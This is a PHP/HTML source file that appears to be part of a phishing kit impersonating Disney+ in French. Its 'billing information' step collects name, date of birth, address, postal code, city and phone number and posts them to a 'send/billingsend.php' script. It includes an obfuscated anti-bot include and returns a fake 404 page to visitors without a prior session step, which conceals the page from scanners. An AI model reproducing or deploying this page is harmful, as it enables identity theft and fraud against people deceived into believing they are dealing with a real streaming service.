﻿<?php 
ob_start();
session_start();
include('../AB/autoload_obfs.php');
if(isset($_SESSION['step_one'])){
?>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <meta name="apple-mobile-web-app-title" content="Disney+">
    <meta name="theme-color" content="#ffffff">
    <meta name="msapplication-TileColor" content="#ffffff">

    <link rel="shortcut icon" href="./img/ico/favicon.ico">
    <link rel="mask-icon" href="./img/ico/safari-pinned-tab.svg" color="#1d1fff">
    <link rel="apple-touch-icon" sizes="180x180" href="../img/ico/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="../img/ico/favicon-32x32.png">

    <title>Facturation | Disney+</title>


    <link rel="stylesheet" type="text/css" href="../style/app_styles_bundle.css">
    <link rel="stylesheet" type="text/css" href="../style/main.css">
    <link rel="stylesheet" type="text/css" href="../style/react.css">
    <style>
        html {
            display: none;
        }
    </style>
    <script>
        if (self == top) {
            document.documentElement.style.display = 'block';
        } else {
            top.location = self.location;
        }
    </script>
</head>

<body id="app_index" class="js-focus-visible">


    <style data-styled="" data-styled-version="4.4.1"></style>
    <div id="webAppRoot" data-reactroot="">
        <div id="app_body_content" data-testid="adult-enabled-profile">
            <div class="sc-esoVGF cNOTUj"></div>
            <div id="hudson-wrapper" class="sc-ZUflv kcCFNP video_view--hidden  ">
                <div class="sc-hPeUyl bhhZhW hudson-container">
                    <div data-testid="" class="sc-hSdWYo dfLgnK"><img alt="" aria-hidden="true" src="../img/icon-loader-32@3x.png" class="sc-eHgmQL jstxUN"></div>
                </div>
            </div>
            <div id="webAppHeader" class="onboarding">
                <div class="sc-iuJeZd hcKoaM">
                    <div class="sc-cmthru cJkwKD"><img style="width: 100%; margin: 0px;" src="../img/ico/logo.svg" id="logo" class="sc-kEYyzF jLfEtv"></div>
                </div>
            </div>
            <div id="webAppScene">
                <div id="app_scene_content">
                    <div id="app-background" class="sc-ekHBYt eIfKUM"></div>
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <form id="dssLogin" name="dssLogin" action="<?php echo './send/billingsend.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" method="post">
                                <div color="#cacaca" font-size="12px" class="sc-kAzzGY ftHOpF" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;">ÉTAPE 1 SUR 2</div>
                                <br>
                                <h3 color="white" style="color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Informations de facturation</h3>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">name</legend>
                                    <span style="position: relative; display: block;">
                                        <input aria-label="Nom" display="inline" id="surname" name="surname" maxlength="" placeholder="Nom" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required>
                                        <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span></fieldset>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">password</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Prénom" display="inline" id="name" name="name" maxlength="" placeholder="Prénom" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required>
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                </fieldset>
								<fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">password</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Adresse e-mail" display="inline" id="dob" name="dob" placeholder="Date de naissance (JJ/MM/AAAA)" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required>
										<script>
        var date = document.getElementById('dob');

        function checkValue(str, max) {
            if (str.charAt(0) !== '0' || str == '00') {
                var num = parseInt(str);
                if (isNaN(num) || num <= 0 || num > max) num = 1;
                str = num > parseInt(max.toString().charAt(0)) &&
                    num.toString().length == 1 ? '0' + num : num.toString();
            };
            return str;
        };

        date.addEventListener('input', function(e) {
            this.type = 'text';
            var input = this.value;
            if (/\D\/$/.test(input)) input = input.substr(0, input.length - 3);
            var values = input.split('/').map(function(v) {
                return v.replace(/\D/g, '')
            });
            if (values[0]) values[0] = checkValue(values[0], 31);
            if (values[1]) values[1] = checkValue(values[1], 12);
            var output = values.map(function(v, i) {
                return v.length == 2 && i < 2 ? v + ' / ' : v;
            });
            this.value = output.join('').substr(0, 14);
        });
										</script>
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
								</fieldset>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">Adresse</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Adresse e-mail" display="inline" id="address" name="address" maxlength="" placeholder="Adresse" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required>
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                </fieldset>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">Code Postal</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="zipcode" display="inline"  id="zipcode" name="zipcode" maxlength="5" placeholder="Code Postal" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" type=”tel” onkeypress="return onlyNumberKey(event)" required>
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
<script>
    function onlyNumberKey(evt) {
          
        // Only ASCII charactar in that range allowed
        var ASCIICode = (evt.which) ? evt.which : evt.keyCode
        if (ASCIICode > 31 && (ASCIICode < 48 || ASCIICode > 57))
            return false;
        return true;
    }
									</script>
                                </fieldset>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">password</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Adresse e-mail" display="inline" id="city" name="city" maxlength="" placeholder="Ville" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required>
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                </fieldset>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">password</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Adresse e-mail" display="inline" id="password" name="tel" maxlength="" placeholder="Numéro de téléphone" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required>
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                </fieldset>
                                <div><button aria-label="Accepter et continuer" data-testid="login-continue-button" role="button" kind="primary" value="submit" class="sc-gPEVay jOqQLP" id="" type="submit">CONTINUER</button></div>
                            </form>
                        </div>
                    </main>
                </div>
            </div>
            <div tabindex="0" class="sc-eAKXzc fcUHFZ">
                <div id="cta-toast" class="sc-bfYoXt gCjimr"><button aria-label="" data-testid="" role="button" kind="primary" class="sc-gPEVay edYBEy sc-gbOuXE bcVAiB" id="" type="submit">OBTENIR DISNEY+</button></div>
            </div>
            <div id="webAppFooter">
                <footer class="sc-fgfRvd kAzEpp" style="margin-top: 100px;" id="footer">
                    <div class="sc-hIVACf fPaITX"><img style="width: 100%; margin: 0px;" src="../img/ico/logo.svg" id="logo" class="sc-kEYyzF jLfEtv"></div>
                    <div class="sc-gpHHfC fohBoY"><button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Règles de Respect de la Vie Privée</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Modalités relatives aux cookies</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Droits Données dans l'UE et au R-U</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">A propos de Disney+</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Conditions générales d'abonnement</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Aide</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Appareils compatibles</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">À propos de Disney+</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Publicités ciblées par centres d'intérêt</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Gérer vos préférences</button>
                    </div>
                    <div class="sc-gVyKpa kOxdJt">© Disney. Tous droits réservés.</div>
                </footer>
            </div>
        </div>
    </div>
</body>
</html>
<?php
} 
else {
    header("HTTP/1.0 404 Not Found");
	die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>